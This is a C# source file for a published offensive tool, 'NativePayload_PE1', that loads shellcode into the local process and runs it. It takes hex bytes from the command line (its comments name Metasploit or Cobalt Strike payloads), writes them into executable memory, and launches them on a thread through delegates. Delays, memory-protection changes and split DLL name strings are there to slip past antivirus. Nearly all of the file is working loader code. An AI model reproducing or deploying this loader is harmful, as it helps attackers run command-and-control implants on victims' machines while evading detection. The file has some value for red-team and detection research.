using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace NativePayload_PE1
{


    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernelbase.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        //[DllImport("kernelbase.dll")]

        //public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        //[DllImport("kernel32.dll")]
        //static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        //[DllImport("kernel32.dll")]
        //public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        //[DllImport("ke" + "rne" + "l" + "32.dll")]
        //public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [SuppressUnmanagedCodeSecurity][UnmanagedFunctionPointer(CallingConvention.Cdecl)] 
        private delegate void __Assembly();

        [DllImport("ke" + "rne" + "l" + "32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("ntdll.dll")]

        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);

        //[DllImport("ntdll.dll")]
        //public static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle,
        //       IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits,
        //       uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
        public static void showcmd(string step ,string s , IntPtr p)
        {
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("Step{0} Delegate.Invoke(", step);
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", p.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::{0}]",s);
            Console.WriteLine();
        }
        static void Main(string[] args)
        {

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_PE1 , Published by Damon Mohammadbagher , May 2022");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_PE1 Asm Bytes + Thread Injection into local Process + C# Delegation");
            Console.WriteLine();

            /// syntax => NativePayload_PE1.exe "fc,48,...."
            /// metasploit or cobaltstrike payload "fc,48,..."

            /// use this "ReadKey" to monitor API callS via API Monitor tool v2 
            //Console.ReadKey();

            new System.Threading.Thread(() =>
             {
                 string[] X = args[0].Split(',');
                 byte[] _asm_shell = new byte[X.Length];
                 for (int i = 0; i < X.Length; i++)
                     _asm_shell[i] = Convert.ToByte(X[i], 16);

                 uint _out = 20;

                 IntPtr ProcessHandle = OpenProcess(ProcessAccessFlags.All, false, 
                     System.Diagnostics.Process.GetCurrentProcess().Id);

                 System.Threading.Thread.Sleep(30000);

                 IntPtr _VA = VirtualAlloc(IntPtr.Zero, (UIntPtr)_asm_shell.Length, 0x1000, 0x40);
                 showcmd("1", "VirtualAlloc", _VA);

                 System.Threading.Thread.Sleep(60000);

                 //Marshal.Copy(_asm_shell, 0, shellcodeAddr, _asm_shell.Length);
                 RtlMoveMemory(_VA, _asm_shell, (uint)_asm_shell.Length);
                 showcmd("2", "RtlMoveMemory", IntPtr.Zero);


                 ThreadStart _ts = new ThreadStart(() =>
                 {
                     __Assembly _Method = (__Assembly)Marshal.GetDelegateForFunctionPointer
                     (_VA, typeof(__Assembly));

                     /// Delegation Technique to change code but with same result [Technique D]
                     Delegate _Delegate = new Action(() => { _Method(); });
                     _Delegate.DynamicInvoke(); /*_Method();*/
                 });

                 //_thread.Start();
                 Thread _t = new Thread(_ts);
                 Delegate _TDelegate = new Action(() => { _t.Start(); });
                 _TDelegate.DynamicInvoke();                
                 showcmd("3", "C# thread started", IntPtr.Zero);

                 VirtualProtectEx(ProcessHandle, _VA, (UIntPtr)_asm_shell.Length, 0x10, out _out);
                 showcmd("4", "VirtualProtectEx [delay + Set to 0x10 (Execute mode)", _VA);

                 System.Threading.Thread.Sleep(120000);

                 showcmd("5", "VirtualProtectEx [delay + Set to 0x20 (Read_Execute mode)", _VA);
                 VirtualProtectEx(ProcessHandle, _VA, (UIntPtr)_asm_shell.Length, 0x20, out _out);

                 Console.WriteLine("\nBingo Meterpreter Session by Thread Injection Method + Delegations ;)");

             }).Start();
            Console.ReadKey();
        }
    }

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VMOperation = 0x00000008,
        VMRead = 0x00000010,
        VMWrite = 0x00000020,
        DupHandle = 0x00000040,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        Synchronize = 0x00100000,
        All = 0x001F0FFF
    }

    [Flags]
    public enum AllocationType
    {
        Commit = 0x00001000,
        Reserve = 0x00002000,
        Decommit = 0x00004000,
        Release = 0x00008000,
        Reset = 0x00080000,
        TopDown = 0x00100000,
        WriteWatch = 0x00200000,
        Physical = 0x00400000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
        NoAccess = 0x0001,
        ReadOnly = 0x0002,
        ReadWrite = 0x0004,
        WriteCopy = 0x0008,
        Execute = 0x0010,
        ExecuteRead = 0x0020,
        ExecuteReadWrite = 0x0040,
        ExecuteWriteCopy = 0x0080,
        GuardModifierflag = 0x0100,
        NoCacheModifierflag = 0x0200,
        WriteCombineModifierflag = 0x0400
    }
    [Flags]
    public enum AccessMask
    {

        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x0008000,
        SYNCHRONIZE = 0x00100000,

        STANDARD_RIGHTS_REQUIRED = 0x000F0000,

        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,
        STANDARD_RIGHTS_ALL = 0x001F0000,
        SPECIFIC_RIGHTS_ALL = 0x0000FFFF,
        ACCESS_SYSTEM_SECURITY = 0x01000000,
        MAXIMUM_ALLOWED = 0x02000000,
        GENERIC_READ = 0x8000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,

        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,

        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,

        WINSTA_ALL_ACCESS = 0x0000037F,
    };
}

